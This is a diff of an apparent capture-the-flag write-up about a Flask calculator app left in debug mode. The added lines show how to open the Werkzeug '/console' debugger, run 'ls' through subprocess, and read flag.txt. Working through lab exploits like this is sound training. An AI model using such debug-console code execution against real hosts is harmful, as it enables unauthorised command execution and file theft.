@@ -40,7 +40,7 @@ if __name__ == "__main__":
     app.run(debug=True)
 ```
 
-We could try and get the calculator app to crash and get us our juicy exception, but there is error handling present and we would have to trigger an error other than a Value or Type error to get an unmanaged exception instead of the `safe_cast()` function just returning a None type object:
+We could try to mess with the input of the calculator function to get an exception, but there is error handling present and we would have to trigger an error other than a Value or Type error to get an unmanaged exception instead of the `safe_cast()` function just returning a None type object:
 ```python
 def safe_cast(val, to_type):
     try:
@@ -94,3 +94,30 @@ def __init__(
         pin_logging: bool = True,
 ```
 
+Appending `/console` to the end of the URL provides a Python interpreter prompt to us!
+![console](https://user-images.githubusercontent.com/92492482/190878137-886d4835-8b51-4334-a8fd-c5c917657787.png)
+
+We can use this prompt to execute Python code on the machine hosting the app.
+Let's start by figuring out where we are currently in the file system and what files are in our current working directory.
+We can run the `ls` command using the subprocess module, and redirect it's output to a `print()` function:
+```python
+import subprocess;
+command = subprocess.Popen(['ls'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT);
+stdout,stderr = command.communicate();
+print(stdout)
+```
+
+Note that when using the above code, you can shorten it to one line as long as you keep the semi-colons in between 'lines'.
+
+`ls` shows us there is a `flag.txt` file in our directory:
+![command1](https://user-images.githubusercontent.com/92492482/190877913-ddaae118-67c9-4e12-bfc1-46df689bb660.png)
+
+
+We can now open the file as text and display it using another print() function:
+```python
+flag = open("./flag.txt", "rt");
+print(flag.read())
+```
+
+## 🥳 Flag obtained! 🎉: 
+![command2](https://user-images.githubusercontent.com/92492482/190878136-996a361d-8c56-4edf-8843-d8b8233c5964.png)
